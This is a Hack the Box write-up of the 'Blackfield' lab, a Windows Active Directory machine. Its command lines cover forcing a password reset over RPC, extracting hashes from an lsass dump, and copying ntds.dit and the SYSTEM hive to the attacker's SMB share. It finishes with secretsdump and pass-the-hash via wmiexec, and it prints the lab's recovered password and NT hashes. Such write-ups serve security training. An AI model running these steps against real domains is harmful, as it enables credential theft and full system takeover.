---
layout: post
title:  "Hack the Box - Blackfield"
category: "Writeups"
---

## Enumeration
# NMAP

```bash
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-05-22 11:03:09Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB
- We can get a valid list of users

## AS-REP
- We get a hit!

```support@blackfield : #00^BlackKnight```

## Enumeration with support
# SMB 
- Nothing

## Evil-WinRM
- Can't login

## Bloodhound
- Observing the support node, we motice the "Outbound Control Rights" which allows us to "ForceChangePassword" to the audit2020 account
- ![[ForceChangePassBH.png]](/images/HTB/Blackfield/ForceChangePassBH.png)
- [We can change the password for the AUDIT2020 user over RPC](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)


```bash
rpcclient -U blackfield.local/support 10.10.10.192
```

```bash
setuserinfo2 AUDIT2020 23 'turco123!'
```
- Validate: ![[ChangePassSuccess.png]](/images/HTB/Blackfield/ChangePassSuccess.png)

## Enumeration with Audit2020
# SMB
- We can read the forensic share: ![[forensic-share.png]](/images/HTB/Blackfield/forensic-share.png)
- We find lsass.zip there which can be used to extract hashes
- Instead of using mimikatz, we can use pypykatz

```bash
pypykatz lsa minidump lsass.DMP
```

- We get the NT hash for the svc_backup user

```svc_backup : 9658d1d1dcd9250115e2205d9f48400d```

## Enumeration with svc_backup
- We are good to Win-RM in! ![[svc_backup-WinRM.png]](/images/HTB/Blackfield/svc_backup-WinRM.png)

# Basic Windows Enum

```windows
whoami /all
```
- Output:

```windows
USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
- The key one here is the "SeBackupPrivilege"

## SeBackupPrivilege
- [Resource to help for escalating privs](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
- We can use a smbserver to transfer files
- [Another resource](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)
- Following the steps in method 1, we can perform the backup to get the Administrator hash
- Transferring files with smb:

Our machine:
```bash
impacket-smbserver turco ./priv -smb2support
```


Victim:
```windows
net use \\10.10.14.6\turco
```

```windows
copy <file> \\10.10.14.6\turco
```

- First run the script provided in the article which creates the E share
- Use robocpy to get the ntds.dit from the E share
```windows
robocopy /b E:\Windows\ntds . ntds.dit
```
- Get system file to decrypt 
```windows
reg save hklm\system c:\temp\system
```
- Download with smb server

- Get hashes with secretsdump
```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```
- ![[Windows/Hard/Blackfield/secretsdump.png]](/images/HTB/Blackfield/secretsdump.png)

```Administrator : 184fb5e5178480be64824d4cd53b99ee```

- Now we can enter the system as Administrator

```bash
impacket-wmiexec blackfield.local/Administrator@10.10.10.192 -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
```
- We are in!